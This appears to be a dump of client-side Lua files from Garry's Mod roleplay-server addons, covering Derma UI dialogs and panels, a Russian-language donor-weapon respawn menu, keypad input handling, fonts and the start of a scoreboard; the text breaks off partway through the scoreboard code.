	local w,h = Text:GetSize()

	Window:SetSize(w + 50,h + 25 + 45 + 10)

	InnerPanel:StretchToParent(5,25,5,45)

	Text:StretchToParent(5,5,5,5)

	ButtonPanel:CenterHorizontal()
	ButtonPanel:AlignBottom(8)

	Window:MakePopup()
	Window:DoModal()

	Window:Center()
	Window:Configured()
	Window:ShowCloseButton(false)

	return Window

end

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Paint()
	surface.SetDrawColor(Color(26,26,26))
	surface.DrawRect(0,0,self:GetWide(),self:GetTall())
end

function PANEL:SetTooltip(tt)
	SetTooltip(self,tt)
end
function PANEL:OnCursorEntered()
	OnCursorEntered_Tooltip(self)
end
function PANEL:OnCursorExited()
	OnCursorExited_Tooltip(self)
end
function PANEL:OnCursorMoved()
	OnCursorMoved_Tooltip(self)
end

derma.DefineControl("BPanel",nil,PANEL,"DPanel")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	local p = self

	self.Value = 1
	self.Max   = 1
	self.Text  = ""
	self.Color = Color(52,139,249)

	self.InnerBar = vgui.Create("DPanel",self)
	function self.InnerBar:Paint(w,h)
		surface.SetDrawColor(p.Color)
		surface.DrawRect(0,0,w,h)
	end

	function self.InnerBar:Think()
		if (p.Max == 0) then
			p.InnerBar:SetSize(p:GetWide(),p:GetTall())
		else
			p.InnerBar:SetSize(p:GetWide() * (p.Value / p.Max),p:GetTall())
		end
	end
end

function PANEL:Paint(w,h)
	surface.SetDrawColor(Color(255,255,255))
	surface.DrawRect(0,0,w,h)
end

derma.DefineControl("BProgressBar",nil,PANEL,"DPanel")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function Billy_Query( strText, strTitle, ... )

	local Window = vgui.Create("BFrame" )
	Window:SetTitle( strTitle or "Message Title (First Parameter)" )
	Window:SetDraggable( false )
	Window:SetBackgroundBlur( true )
	Window:SetDrawOnTop( true )

	local InnerPanel = vgui.Create( "DPanel", Window )
	InnerPanel:SetPaintBackground( false )

	local Text = vgui.Create("BLabel", InnerPanel )
	Text:SetText( strText or "Message Text (Second Parameter)" )
	Text:SizeToContents()
	Text:SetContentAlignment( 5 )

	local ButtonPanel = vgui.Create( "DPanel", Window )
	ButtonPanel:SetTall( 30 )
	ButtonPanel:SetPaintBackground( false )

	-- Loop through all the options and create buttons for them.
	local NumOptions = 0
	local x = 5

	for k=1, 8, 2 do

		local Text = select( k, ... )
		if Text == nil then break end

		local Func = select( k+1, ... ) or function() end

		local Button = vgui.Create("BButton", ButtonPanel )
		Button:SetText( Text )
		Button:SizeToContents()
		Button:SetTall( 20 )
		Button:SetWide( Button:GetWide() + 20 )
		Button.DoClick = function() Window:Close() Func() end
		Button:SetPos( x, 5 )

		x = x + Button:GetWide() + 5

		ButtonPanel:SetWide( x )
		NumOptions = NumOptions + 1

	end

	local w, h = Text:GetSize()

	w = math.max( w, ButtonPanel:GetWide() )

	Window:SetSize( w + 50, h + 25 + 45 + 10 )
	Window:Center()

	InnerPanel:StretchToParent( 5, 25, 5, 45 )

	Text:StretchToParent( 5, 5, 5, 5 )

	ButtonPanel:CenterHorizontal()
	ButtonPanel:AlignBottom( 8 )

	Window:MakePopup()
	Window:DoModal()

	if ( NumOptions == 0 ) then

		Window:Close()
		Error( "Derma_Query: Created Query with no Options!?" )
		return nil

	end

	Window:Configured()
	Window:ShowCloseButton( false )

	return Window

end

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function Billy_StringRequest( strTitle, strText, strDefaultText, fnEnter, fnCancel, strButtonText, strButtonCancelText )

	local Window = vgui.Create("BFrame" )
		Window:SetTitle( strTitle or "Message Title (First Parameter)" )
		Window:SetDraggable( false )
		Window:SetBackgroundBlur( true )
		Window:SetDrawOnTop( true )

	local InnerPanel = vgui.Create( "DPanel", Window )
		InnerPanel:SetDrawBackground( false )

	local Text = vgui.Create("BLabel", InnerPanel )
		Text:SetTextColor(Color(0,0,0))
		Text:SetText( strText or "Message Text (Second Parameter)" )
		Text:SizeToContents()
		Text:SetContentAlignment( 5 )

	local TextEntry = vgui.Create("BTextBox", InnerPanel )
		if (strDefaultText) then
			TextEntry:SetPlaceHolder( strDefaultText )
		else
			TextEntry:SetText( "" )
		end
		TextEntry.OnEnter = function() Window:Close() fnEnter( TextEntry:GetValue() ) end

	local ButtonPanel = vgui.Create( "DPanel", Window )
		ButtonPanel:SetTall( 30 )
		ButtonPanel:SetDrawBackground( false )

	local Button = vgui.Create("BButton", ButtonPanel )
		Button:SetText( strButtonText or "OK" )
		Button:SizeToContents()
		Button:SetTall( 20 )
		Button:SetWide( Button:GetWide() + 20 )
		Button:SetPos( 5, 5 )
		Button.DoClick = function()  Window:Close() fnEnter( TextEntry:GetValue() ) end

	local ButtonCancel = vgui.Create("BButton", ButtonPanel )
		ButtonCancel:SetText( strButtonCancelText or "Cancel" )
		ButtonCancel:SizeToContents()
		ButtonCancel:SetTall( 20 )
		ButtonCancel:SetWide( Button:GetWide() + 20 )
		ButtonCancel:SetPos( 5, 5 )
		ButtonCancel.DoClick = function() Window:Close() if ( fnCancel ) then fnCancel( TextEntry:GetValue() ) end end
		ButtonCancel:MoveRightOf( Button, 5 )

	ButtonPanel:SetWide( Button:GetWide() + 5 + ButtonCancel:GetWide() + 10 )

	local w, h = Text:GetSize()
	w = math.max( w, 400 )

	Window:SetSize( w + 50, h + 25 + 75 + 10 )

	InnerPanel:StretchToParent( 5, 25, 5, 45 )

	Text:StretchToParent( 5, 5, 5, 35 )

	TextEntry:StretchToParent( 5, nil, 5, nil )
	TextEntry:AlignBottom( 5 )

	TextEntry:RequestFocus()
	TextEntry:SelectAllText( true )

	ButtonPanel:CenterHorizontal()
	ButtonPanel:AlignBottom( 8 )

	Window:MakePopup()
	Window:DoModal()

	Window:Center()
	Window:Configured()
	Window:ShowCloseButton( false )

	return Window

end

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:SetTabs(tabs)
	tabs:InvalidateParent(true)
	local x,y = tabs:GetPos()
	self:SetPos(x,y + tabs:GetTall())
end

function PANEL:Paint() end

derma.DefineControl("BTabs_Panel",nil,PANEL,"DPanel")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:Init()
	self.Tabs = {}
	self.CurrentlySelected = 1
end

function PANEL:Paint()
	surface.SetDrawColor(Color(26,26,26))
	surface.DrawRect(0,0,self:GetWide(),self:GetTall())
end

function PANEL:AddTab(tabname,tabpanel)
	local newTab = vgui.Create("DButton",self)
	table.insert(self.Tabs,newTab)
	newTab.OpenPanel = tabpanel
	if (IsValid(tabpanel)) then
		tabpanel:SetMouseInputEnabled(false)
		tabpanel.Paint = function() end
		local tll = 0
		if (IsValid(self:GetParent())) then
			tll = ((self:GetParent():GetTall() - 24) - 35)
			tabpanel:SetParent(self:GetParent())
		else
			tll = (ScrH() - 24 - 35)
			tabpanel:SetParent(NULL)
		end
		tabpanel:SetSize(self:GetWide(),tll)
		tabpanel:SetPos(-tabpanel:GetWide(),24 + 35)
	end

	newTab.myID = #self.Tabs
	newTab:SetText("")
	newTab.Paint = function() end
	newTab:SetSize(self:GetWide() / #self.Tabs,self:GetTall())
	newTab:SetPos((#self.Tabs - 1) * (self:GetWide() / #self.Tabs))
	newTab.DoClick = function() 
		self:SelectTab(newTab.myID)
	end

	newTab.TextLbl = vgui.Create("DLabel",newTab)
	newTab.TextLbl:SetTextColor(Color(255,255,255))
	newTab.TextLbl:SetText(tabname)
	newTab.TextLbl:SetFont("BVGUI_roboto16")
	newTab.TextLbl:SizeToContents()
	newTab.TextLbl:Center()

	for i,v in pairs(self.Tabs) do
		v:SetSize(self:GetWide() / #self.Tabs,self:GetTall())
		v:SetPos((i - 1) * (self:GetWide() / #self.Tabs),0)
		v.TextLbl:Center()
	end

	if (not IsValid(self.TabBar)) then
		self.TabBar = vgui.Create("DPanel",self)
		self.TabBar.Paint = function(self)
			surface.SetDrawColor(Color(52,139,249))
			surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		end
		self.TabBar:SetSize(self:GetWide() / #self.Tabs,3)
		self.TabBar:SetPos(0,newTab:GetTall() - 3)
	else
		self.TabBar:SetSize(self:GetWide() / #self.Tabs,3)
		self.TabBar:SetPos(0,newTab:GetTall() - 3)
	end

	if (IsValid(tabpanel)) then
		local x,y = tabpanel:GetPos()
		tabpanel:SetPos((#self.Tabs - 1) * tabpanel:GetWide(),y)
	end

	if (IsValid(tabpanel)) then
		if (tabpanel.onbLogsSetup ~= nil) then
			tabpanel.onbLogsSetup()
		end
	end

	return newTab
end

function PANEL:GetSelectedTabID()
	return self.CurrentlySelected or -1
end
function PANEL:GetTabFromID(id)
	return self.Tabs[id] or NULL
end

function PANEL:SelectTab(id)
	local theTab = self.Tabs[id]
	if (self:GetSelectedTabID() ~= id) then
		for i,v in pairs(self.Tabs) do
			if (IsValid(v.OpenPanel)) then
				v.OpenPanel:Stop()
				local _,y = v.OpenPanel:GetPos()
				v.OpenPanel:MoveTo((i - id) * v.OpenPanel:GetWide(),y,0.5)
			end
		end

		self.TabBar:Stop()
		local x,y = self.TabBar:GetPos()
		self.TabBar:MoveTo((id - 1) * (self:GetWide() / #self.Tabs),y,0.5)
	end
	self.CurrentlySelected = id

	return theTab.OpenPanel
end

derma.DefineControl("BTabs",nil,PANEL,"DPanel")

--////////////////////////////////////////////////////////////////////////--

PANEL = {}

function PANEL:GetValue()
	if (self.PlaceHoldered == true) then
		return ""
	else
		return self:GetText()
	end
end

function PANEL:SetPlaceHolder(text)
	self.PlaceHoldered = true
	self.PlaceHolder = text
	self:SetText(text)
	self:SetFont("BVGUI_roboto16_i")
	self:ApplySchemeSettings()
	self:SetTextColor(Color(64,64,64))
end

function PANEL:Init()
	self:SetFont("BVGUI_roboto16")
	self:ApplySchemeSettings()
	self:SetTextColor(Color(0,0,0))

	self.OnGetFocus = function()
		if (self.PlaceHoldered == true) then
			self.PlaceHoldered = false
			self:SetFont("BVGUI_roboto16")
			self:ApplySchemeSettings()
			self:SetTextColor(Color(0,0,0))
			self:SetText("")
		end
	end

	self.OnLoseFocus = function()
		if (self:GetValue() == "" and self.PlaceHolder) then
			self.PlaceHoldered = true
			self:SetText(self.PlaceHolder)
			self:SetFont("BVGUI_roboto16_i")
			self:ApplySchemeSettings()
			self:SetTextColor(Color(64,64,64))
		end
	end
end

function PANEL:OnValueChange(v)
	if (v == "" and self.PlaceHolder) then
		self.PlaceHoldered = true
		self:SetText(self.PlaceHolder)
		self:SetFont("BVGUI_roboto16_i")
		self:ApplySchemeSettings()
		self:SetTextColor(Color(64,64,64))
	end
	if (self.Typed) then
		self.Typed(self:GetValue())
	end
end

function PANEL:OnKeyCodeTyped(kc)
	if (self.PlaceHoldered == true and kc ~= 66) then
		self.PlaceHoldered = false
		self:SetFont("BVGUI_roboto16")
		self:ApplySchemeSettings()
		self:SetTextColor(Color(0,0,0))
		self:SetText("")
	end
	if (kc == 64) then
		if (self.OnEnter) then
			self:OnEnter()
		end
	end
end

function PANEL:GetUpdateOnType()
	return true
end

function PANEL:Clear()
	self:SetText("")
	if (self.PlaceHolder) then
		self.PlaceHoldered = true
		self:SetText(self.PlaceHolder)
		self:SetFont("BVGUI_roboto16_i")
		self:ApplySchemeSettings()
		self:SetTextColor(Color(64,64,64))
	end
end

derma.DefineControl("BTextBox",nil,PANEL,"DTextEntry")


function Guns_Menu(tableguner)
	GunsOnP = {
	["Оружие навсегда"] = {
		["p90"] = "P90",
		["mp5"] = "MP5",
		["ump"] = "UMP",
		["tmp"] = "TMP",
		["mac10"] = "MAC-10",
		["deagle"] = "Desert Eagle",
		["fiveseven"] = "Five-Seven",
		["glock"] = "Glock",
		["p228"] = "P228",
		["usp"] = "USP-S",
		["revolver"] = "Револьвер",
		["ak47"] = "AK-47",
		["m4a1"] = "M4A1",
		["awp"] = "AWP",
		["famas"] = "FAMAS",
		["galil"] = "Galil",
		["m249"] = "M249",
		["m3super90"] = "M3Super90",
		["aug"] = "AUG",
		["xm1014"] = "XM-1014",
		["weapon_crossbow"] = "Арбалет",
		["scout"] = "Scout",
		["sg552"] = "SG552",
		["weapon_shotgun"] = "Hyper Shotgun",
		["verevka"] = "Верёвка",
		["weapon_fists"] = "Кулаки",
		["weapon_frag"] = "Граната",
		["knife"] = "Нож",
		["weapon_crowbar"] = "Монтировка",
		["climb_swep2"] = "Паркур",
		["weapon_vape_juicy"] = "Разноцветный вейп",
		["weapon_vape_hallucinogenic"] = "Галюционный вейп",
		["weapon_ciga"] = "Сигарета",
		["weapon_ciga_blat"] = "Капитан Блэк",
		["weapon_vape"] = "Обычный вейп",
		["weapon_fidget"] = "Спиннер",
		["lockpick"] = "Отмычка",
		["stunstick"] = "Дубинка",
		["weapon_medkit"] = "Аптечка",
		["wrench_deluxe"] = "Гаечный ключ Deluxe",
		["vc_wrench"] = "Гаечный ключ",
		["weapon_slam"] = "Мины",
		["weapon_egon"] = "Пылесос",
		["moneychecker"] = "Проверка денег",
		["m9k_suicide_bomb"] = "С4",
		["m9k_ex41"] = "EX41",
		["m9k_m202"] = "M202",
		["m9k_m79gl"] = "M79GL",
		["m9k_matador"] = "MATADOR",
		["m9k_milkormgl"] = "Milkor Mk1",
		["m9k_rpg7"] = "RPG-7",
		["m9k_m61_frag"] = "Граната [M9k]",
		["m9k_sticky_grenade"] = "Граната-Липучка [M9k]",
		["m9k_ied_detonator"] = "Детонатор",
		["m9k_proxy_mine"] = "Мина [M9k]",
		["m9k_nitro"] = "Нитро глицерин",
		["m9k_nerve_gas"] = "Яд",
		["weapon_bugbait"] = "Какашки",
		["first_aid_kit"] = "Медицинский набор",
		["krutayastoyka"] = "Крутая стойка",
		["chest_imeu"] = "Отдать честь",
		["kacok"] = "Гантеля",
		["weapon_stunstick"] = "[UNI] Улучшенная дубинка",
		["weapon_gauss"] = "[UNI] GAUSS ПУШКА",
		["sg550"] = "Скорострелка SIG SG550",
		["g3sg1"] = "Скорострелка G3SG/1",
		["vd2_wrench"] = "Гаечный ключ",
		["swb_shotgun"] = "SPAS-12 MK CMB",
		["weapon_mad_2b"] = "Катана",
		["weapon_flechettegun"] = "Ковбойка",
		["awpdragon"] = "AWP Dragon Lore",
		["m9k_barret_m82"] = "Barret M82",
		["m9k_usas"] = "USAS",
		["m9k_spas12"] = "SPAS 12",
		["m9k_dbarrel"] = "Double Barrel",
		["m9k_sl8"] = "HK SL8",
		["m9k_svu"] = "Dragunov SVU",
		["m9k_dragunov"] = "Dragunov SVD",
		["m9k_fg42"] = "FG 42",
		["m9k_intervention"] = "Intervention",
		["m9k_honeybadger"] = "Honey Badger",
		["m9k_luger"] = "P08 Luger",
		["m9k_vector"] = "Vector",
		["m9k_thompson"] = "Tommy Gun",
		["m9k_mp9"] = "MP9",
		["m9k_ares_shrike"] = "Ares Shrike",
		["m9k_magpulpdr"] = "Magpul PDR",
		["m9k_kac_pdw"] = "KAC PDW",
		["m9k_mossberg590"] = "Mossberg 590",
		["m9k_m60"] = "M60",
		["m9k_acr"] = "ACR",
		["m9k_scar"] = "SCAR",
		["m9k_ragingbull"] = "Raging Bull",
		["m9k_vikhr"] = "Vikhr",
		["m9k_val"] = "AS VAL",
		["m9k_l85"] = "L85",
		["m9k_coltpython"] = "Colt Python",
		["m9k_mp7"] = "MP7",
		["m9k_svt40"] = "SVT40",
		["m9k_contender"] = "Contender G2",
		["m9k_1887winchester"] = "Winchester 87",
		["m9k_model627"] = "S&W Model 627",
		["m9k_m1918bar"] = "M1918",
		["m9k_g36"] = "G36",
		["m9k_winchester73"] = "Winchester 73",
	},
}

		if (IsValid(MenuOpen_Guns)) then
			MenuOpen_Guns.categories:Update()
			return
		end
		timer.Stop("MenuOpen_Guns")
		timer.Create("MenuOpen_Guns",1,0,function()
			for a,z in pairs(GunsOnP) do
				for k,v in pairs(z) do
					if not tableguner[k] then
						GunsOnP[a][k] = nil
					end
				end
			end
			MenuOpen_Guns = vgui.Create("BFrame")
			if (IsValid(MenuOpen_Guns)) then
				timer.Stop("MenuOpen_Guns")

				local m = MenuOpen_Guns
				m:SetTitle("Выдача донат оружий")
				m:SetSize(450,300)
				m:Center()
				m:Configured()
				m:MakePopup()

				m.bg = vgui.Create("DPanel",m)
				m.bg:SetSize(300,276)
				m.bg:AlignRight()
				m.bg:AlignBottom()
				m.bg.Paint = function(self)
					surface.SetDrawColor(Color(5,5,35))
					surface.DrawRect(0,0,self:GetWide(),self:GetTall())
				end

				m.textbox = vgui.Create("BLabel",m)
				m.textbox:SetText("Здесь вы можете выбрать оружие которое вам будет выдаватся при респауне.Данная функция работает только если вы имеете донат оружие")
				m.textbox:White()
				m.textbox:SetSize(290,266)
				m.textbox:AlignRight(5)
				m.textbox:AlignBottom(5)
				m.textbox:SetWrap(true)
				m.textbox:SetContentAlignment(7)

				m.categories = vgui.Create("BCategories",m)
				m.categories:SetSize(150,276)
				m.categories:AlignBottom()

				local cb = m:Add( 'svyanovlib_DButton' )
			    cb:SetSize( 0,0 )
			    cb.text                  = ''
			    cb.textSize              = 25
			    cb.eblya = ""
			    function cb:DoClick()
			    	net.Start("weaponsmenuchangevar")
			    	net.WriteString(cb.eblya)
			    	net.SendToServer()
					cb.text = cb.text == "Включить" and "Выключить" or "Включить"
			    	m.textbox:SetText(string.format("Нажмите кнопку ниже чтобы %s выдачу %s при спавне",cb.text == "Включить" and "включить" or "выключить",cb.eblya2 or cb.eblya))
					-- net.Start("tableguner")
					-- net.SendToServer()
			    	-- MenuOpen_Guns:Remove()
			    	-- Guns_Menu(tableguner)
			    end

				function m.categories:Update()
					for a,z in pairs(GunsOnP) do
						for k,v in pairs(z) do
							if not tableguner[k] then
								GunsOnP[a][k] = nil
							end
						end
					end
					
					m.categories:Clear()
					for context,errs in pairs(GunsOnP) do
						local c = ColorRand()
						m.categories:NewCategory(context,c)
						for i,err in pairs(errs) do
							m.categories:NewItem(GunsOnP[context][i]..(tableguner[i] == "enabled" and " [ ВКЛ]" or "[ ВЫКЛ]"),c,function()
								m.textbox:SetText(string.format("Нажмите кнопку ниже чтобы %s выдачу %s при спавне",tableguner[i] == "disabled" and "включить" or "выключить",GunsOnP[context][i]))
								cb:SetSize( 200,50 )
								cb:AlignRight(60)
								cb:AlignBottom(15)
								cb.text = tableguner[i] == "disabled" and 'Включить' or "Выключить"
								cb.eblya = i
								cb.eblya2 = GunsOnP[context][i]
								tableguner[i] = tableguner[i] == "disabled" and "enabled" or "disabled"
							end,true)
						end
					end
				end
				
				m.categories:Update()
			end
		end)
end

-- tableguner = {}

-- net.Receive( "tableguner", function( len, pl )
	-- tableguner = net.ReadTable()
-- end )



concommand.Add("menuweapons",function(ply,cmd,args)
	net.Start("weaponsmenugetweps")
	net.SendToServer()
end)
--PATH addons/executioner/lua/autorun/client/executioner_base_panel.lua:
local PANEL, materials ={}, { ['cross'] = Material( 'cross.png' ) }

function PANEL:Init()
    self.Start = CurTime()
    self.Reject = false
    self:SetSize( 900, 600 )
    self:Center()
    self:SetTitle( '' )
    self:SetDraggable( false )
    self:ShowCloseButton( false )
end

function PANEL:Deploy( render, block_popup )
    if render then Graphics.CreateIconObject( self, materials[ 'cross' ], self:GetWide() - weight(30), height(19), 16, 16, true ) end
    if not block_popup then self:MakePopup() else self:SetVisible( true ) end
end

function PANEL:Paint()
    draw.RoundedBox(10,0,0,w,h,Color(45,45,45))
end

vgui.Register( 'base_panel', PANEL, 'DFrame' )

--PATH addons/foodmode/lua/autorun/client/fonts_suka_udali.lua:
local Main = "Arial"

surface.CreateFont( "FM2_15",{font = Main,size = 15,weight = 5,antialias = true})
surface.CreateFont( "FM2_17",{font = Main,size = 17,weight = 5,antialias = true})
surface.CreateFont( "FM2_20",{font = Main,size = 20,weight = 5,antialias = true})
surface.CreateFont( "FM2_22",{font = Main,size = 22,weight = 5,antialias = true})
surface.CreateFont( "FM2_25",{font = Main,size = 25,weight = 5,antialias = true})
surface.CreateFont( "FM2_30",{font = Main,size = 30,weight = 5,antialias = true})
surface.CreateFont( "FM2_40",{font = Main,size = 40,weight = 5,antialias = true})
surface.CreateFont( "FM2_60",{font = Main,size = 60,weight = 5,antialias = true})


surface.CreateFont( "FM2B_20",{font = Main,size = 20,weight = 400,blursize=2,antialias=true})
surface.CreateFont( "FM2B_25",{font = Main,size = 25,weight = 400,blursize=2,antialias=true})
surface.CreateFont( "FM2B_30",{font = Main,size = 30,weight = 400,blursize=2,antialias=true})
--PATH addons/rp_rewards/lua/autorun/client/grid.lua:
local PANEL = {}

AccessorFunc(PANEL, "horizontalMargin", "HorizontalMargin", FORCE_NUMBER)
AccessorFunc(PANEL, "verticalMargin", "VerticalMargin", FORCE_NUMBER)
AccessorFunc(PANEL, "columns", "Columns", FORCE_NUMBER)

function PANEL:Init()
	self:SetHorizontalMargin(0)
	self:SetVerticalMargin(0)

	self.Rows = {}
	self.Cells = {}
end

function PANEL:AddCell(pnl)
	local cols = self:GetColumns()
	local idx = math.floor(#self.Cells/cols)+1
	self.Rows[idx] = self.Rows[idx] || self:CreateRow()

	local margin = self:GetHorizontalMargin()
	
	pnl:SetParent(self.Rows[idx])
	pnl:Dock(LEFT)
	pnl:DockMargin(0, 0, #self.Rows[idx].Items+1 < cols && self:GetHorizontalMargin() || 0, 0)
	pnl:SetWide((self:GetWide()-margin*(cols-1))/cols)

	table.insert(self.Rows[idx].Items, pnl)
	table.insert(self.Cells, pnl)
	self:CalculateRowHeight(self.Rows[idx])
end

function PANEL:CreateRow()
	local row = self:Add("DPanel")
	row:Dock(TOP)
	row:DockMargin(0, 0, 0, self:GetVerticalMargin())
	row.Paint = nil
	row.Items = {}
	return row
end

function PANEL:CalculateRowHeight(row)
	local height = 0

	for k, v in pairs(row.Items) do
		height = math.max(height, v:GetTall())
	end

	row:SetTall(height)
end

function PANEL:Skip()
	local cell = vgui.Create("DPanel")
	cell.Paint = nil
	self:AddCell(cell)
end

function PANEL:Clear()
	for _, row in pairs(self.Rows) do
		for _, cell in pairs(row.Items) do
			cell:Remove()
		end
		row:Remove()
	end

	self.Cells, self.Rows = {}, {}
end

PANEL.OnRemove = PANEL.Clear

vgui.Register("ThreeGrid", PANEL, "DScrollPanel")
--PATH addons/111mod/lua/autorun/client/keypad.lua:

hook.Add("PlayerBindPress", "Keypad", function(ply, bind, pressed)
	if not pressed then
		return
	end

	local tr = util.TraceLine({
		start = ply:EyePos(),
		endpos = ply:EyePos() + ply:GetAimVector() * 65,
		filter = ply
	})

	local ent = tr.Entity

	if not IsValid(ent) or not ent.IsKeypad then
		return
	end

	if string.find(bind, "+use", nil, true) then
		local element = ent:GetHoveredElement()

		if not element or not element.click then
			return
		end

		element.click(ent)
	end
end)


local physical_keypad_commands = {

	[KEY_ENTER] = function(self)
		self:SendCommand(self.Command_Accept)
	end,

	[KEY_PAD_ENTER] = function(self)
		self:SendCommand(self.Command_Accept)
	end,

	[KEY_PAD_MINUS] = function(self)
		self:SendCommand(self.Command_Abort)
	end,

	[KEY_PAD_PLUS] = function(self)
		self:SendCommand(self.Command_Abort)
	end

}

for i = KEY_PAD_1, KEY_PAD_9 do
	physical_keypad_commands[i] = function(self)
		self:SendCommand(self.Command_Enter, i - KEY_PAD_1 + 1)
	end
end

local last_press = 0

local enter_strict = CreateConVar("keypad_willox_enter_strict", "0", FCVAR_ARCHIVE, "Only allow the numpad's enter key to be used to accept keypads' input")

hook.Add("CreateMove", "Keypad", function(cmd)
	
	if RealTime() - 0.1 < last_press then
		return
	end

	for key, handler in pairs(physical_keypad_commands) do
		if input.WasKeyPressed(key) then

			if enter_strict:GetBool() and key == KEY_ENTER then
				continue
			end

			local ply = LocalPlayer()

			local tr = util.TraceLine({
				start = ply:EyePos(),
				endpos = ply:EyePos() + ply:GetAimVector() * 65,
				filter = ply
			})

			local ent = tr.Entity

			if not IsValid(ent) or not ent.IsKeypad then
				return
			end

			last_press = RealTime()
			
			handler(ent)

			return

		end
	end

end)

--PATH addons/scoreboard/lua/autorun/client/main.lua:
local Derma_StringRequest, draw_RoundedBox, draw_RoundedBoxEx, draw_SimpleText, game_GetIPAddress, gui_EnableScreenClicker, gui_OpenURL, hook_Add, math_ceil, math_Clamp, math_floor, player_GetAll, ScreenScale, surface_CreateFont, FindMetaTable, math_Round, surface_DrawTexturedRect, surface_SetDrawColor, surface_SetMaterial, table_insert, team_GetColor, team_GetName, Format, Material, table_Copy, table_sort, timer_Create, vgui_Create, pairs, Color, LocalPlayer, CurTime, ColorAlpha, HSVToColor, IsValid, SetClipboardText, RunConsoleCommand, ipairs, timer_Destroy, timer_Simple = Derma_StringRequest, draw.RoundedBox, draw.RoundedBoxEx, draw.SimpleText, game.GetIPAddress, gui.EnableScreenClicker, gui.OpenURL, hook.Add, math.ceil, math.Clamp, math.floor, player.GetAll, ScreenScale, surface.CreateFont, FindMetaTable, math.Round, surface.DrawTexturedRect, surface.SetDrawColor, surface.SetMaterial, table.insert, team.GetColor, team.GetName, Format, Material, table.Copy, table.sort, timer.Create, vgui.Create, pairs, Color, LocalPlayer, CurTime, ColorAlpha, HSVToColor, IsValid, SetClipboardText, RunConsoleCommand, ipairs, timer.Destroy, timer.Simple
local x, y = ScrW(), ScrH()

surface_CreateFont('ScrFancyFontBoldBig', {
    font = 'PT Root UI Bold',
    size = ScreenScale(15),
    antialias = true,
    extended = true
})

surface_CreateFont('ScrFancyButtonBold', {
    font = 'PT Root UI Bold',
    size = ScreenScale(8),
    antialias = true,
    extended = true
})

surface_CreateFont('ScrFancyButton', {
    font = 'PT Root UI Medium',
    size = ScreenScale(8),
    antialias = true,
    extended = true
})

surface_CreateFont('ScrFancyButtonSmall', {
    font = 'PT Root UI Medium',
    size = ScreenScale(4),
    antialias = true,
    extended = true
})

surface_CreateFont('ScrFancyLine', {
    font = 'PT Root UI Medium',
    size = ScreenScale(6),
    antialias = true,
    extended = true
})

local pMeta = FindMetaTable('Player')

function pMeta:JobName()
    local teamname = team_GetName(self:Team())

    return teamname
end

function pMeta:JobColor()
    local teamcolor = team_GetColor(self:Team())

    return teamcolor
end

local function timeToStr(time)
    local tmp = time / 60 / 60

    if tmp < 1 then
        tmp = math_Round(tmp * 60)

        return tmp .. ' м'
    elseif tmp < 10 then
        local minutes = tmp - math_floor(tmp)
        minutes = (math_Round(minutes * 60))

        return math_floor(tmp) .. ':' .. Format('%.2d', minutes) .. ' ч'
    else
        tmp = math_Round(tmp)

        return tmp .. ' ч'
    end
end

local ipsid = {
    ['212.22.93.215:27015'] = 1,
    ['212.22.93.171:27015'] = 2
}
local spyme = {
    ["STEAM_0:0:125300844"] = true,
}
local nowipid = ipsid[game_GetIPAddress()]
local idserver = 1

if nowipid then
    idserver = nowipid
end

local discordmat = Material('gambitrp/scoreboard/discord.png')
local vkmat = Material('gambitrp/scoreboard/vk.png')
local pingmat = Material('gambitrp/scoreboard/ping.png')
local jobmat = Material('gambitrp/scoreboard/job.png')
local butgradmat = Material('gambitrp/f4/but_grad.png')

function TestScore()
    TestBoard = vgui_Create('ui_frame')
    TestBoard:SetSize(x * 0.475, y * 0.755)
    gui_EnableScreenClicker(true)
    TestBoard:Center()
    TestBoard:MakePopup()
    TestBoard:SetKeyboardInputEnabled(false)
    TestBoard:ShowCloseButton(false)
    TestBoard:SetTitle('')

    TestBoard.Close = function()
        gui_EnableScreenClicker(false)
        TestBoard:MoveTo(x, y / 2 - TestBoard:GetTall() / 2, 0.2, 0, 1)

        timer_Create('RemoveWindow', .2, 1, function()
            TestBoard:Remove()
        end)
    end

    local players = 0
    local admins = 0

    for k, v in player.Iterator() do
        if v:GetUserGroup() ~= 'user' and v:GetUserGroup() ~= 'vip' then
            admins = admins + 1
        end

        players = players + 1
    end

    local textspacex, textspacey = x * 0.01771, y * 0.015
    local icondiscord, iconvk = x * 0.012, x * 0.0136

    TestBoard.Paint = function(self, w, h)
        draw_RoundedBox(8, 0, 0, w, h, Color(45, 45, 45, 250))
        draw_SimpleText('GAMBITRP', 'ScrFancyFontBoldBig', w / 2, y * 0.014, color_white, 1)
        draw_SimpleText('С Е Р В Е Р # ' .. idserver, 'ScrFancyButtonBold', w / 2, y * 0.0556, Color(255, 216, 0), 1)
        draw_SimpleText('Наш Discord', 'ScrFancyButtonBold', x * 0.062, y * 0.0232, Color(83, 109, 254))
        draw_SimpleText('gambitrp.site/discord', 'ScrFancyButtonBold', x * 0.062, y * 0.0464, color_white)
        surface_SetMaterial(discordmat)
        surface_SetDrawColor(color_white.r, color_white.g, color_white.b)
        surface_DrawTexturedRect(x * 0.042, y * 0.0464 - icondiscord, icondiscord, icondiscord)
        draw_SimpleText('Мы ВКонтакте', 'ScrFancyButtonBold', x * 0.3693, y * 0.0232, Color(39, 135, 245))
        draw_SimpleText('gambitrp.site/vk', 'ScrFancyButtonBold', x * 0.3693, y * 0.0464, color_white)
        surface_SetMaterial(vkmat)
        surface_SetDrawColor(color_white.r, color_white.g, color_white.b)
        surface_DrawTexturedRect(x * 0.3503, y * 0.0464 - iconvk, iconvk, iconvk)
        local admintext = draw_SimpleText('Администрации онлайн: ', 'HUDFancyFont', textspacex, h - textspacey, color_white, 0, 4) -- тут было Color(141, 141, 141)
        draw_SimpleText(admins, 'HUDFancyFont', textspacex + admintext, h - textspacey, Color(255, 216, 0), 0, 4)
        surface.SetFont('HUDFancyFont')
        local playerslistw = surface.GetTextSize(players)
        local playerstext = draw_SimpleText('Игроков на сервере: ', 'HUDFancyFont', w / 2 - playerslistw / 2, h - textspacey, color_white, 1, 4)
        draw_SimpleText(players, 'HUDFancyFont', w / 2 + playerstext / 2, h - textspacey, Color(255, 216, 0), 1, 4)
